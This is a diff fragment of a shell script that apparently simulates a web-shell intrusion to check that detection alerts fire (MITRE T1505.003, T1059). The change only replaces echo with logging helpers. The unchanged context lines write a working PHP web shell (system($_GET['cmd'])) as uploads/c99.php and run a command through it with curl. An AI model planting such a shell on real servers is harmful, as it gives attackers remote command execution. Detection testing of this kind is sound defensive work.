@@ -48,13 +48,13 @@ mkdir -p "$ROOT/uploads"
 # shellcheck disable=SC2016  # $_GET is PHP, written to the file literally
 printf '<?php system($_GET["cmd"]); ?>\n' > "$SHELL_FILE"
 chmod 644 "$SHELL_FILE"
-echo "Dropped $SHELL_FILE"
+say "Dropped $SHELL_FILE"
 
 # Let the write be scanned and the log poller start from a quiet point.
 sleep 3
-echo "Running a command through it ..."
+say "Running a command through it ..."
 OUT=$(curl -s "$BASE/uploads/c99.php?cmd=id")
-echo "web shell answered: ${OUT:-<nothing: PHP-FPM is not serving .php>}"
+say "web shell answered: ${OUT:-<nothing: PHP-FPM is not serving .php>}"
 [ -n "$OUT" ] || { echo "PHP is not executed by this server; the scenario proves nothing" >&2; exit 1; }
 sleep 3
-echo "done. Alerts file: T1505.003 and T1059 (parent php-fpm*)."
+done_msg "T1505.003 and T1059 (parent php-fpm*)"
